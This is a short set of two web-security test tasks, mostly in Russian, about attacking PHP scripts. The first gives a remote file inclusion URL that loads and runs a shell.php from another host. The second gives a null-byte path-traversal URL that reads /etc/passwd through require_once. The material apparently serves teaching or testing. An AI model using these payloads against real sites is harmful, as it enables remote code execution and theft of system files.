These are test tasks on web security. Description follows.

Task 1
На сервере должны быть включены register_globals и allow_url_fopen.
 
Для взлома вводится url вида target-site.com/page1.php?file_to_open=http://some-other-site/shell.php
В данных настройках это приведет к подключению удаленного файла shell.php в скрипт page1.php и его исполнению.
Для атаки нужно знать имя переменной file_to_open


Task 2
Здесь используется вставка нулевого байта в плохо экранированную строку, которая используется в параметре функции require_once.
 
Для взлома в параметре GET передается предполагаемый путь к списку паролей, либо любому другому важному файлу:
target-site.com/page1.php?file=../../../etc/passwd%00
 
Для успешной выдачи файла на вывод нужно, чтобы нулевой символ безпрепятственно прошел экранирование.
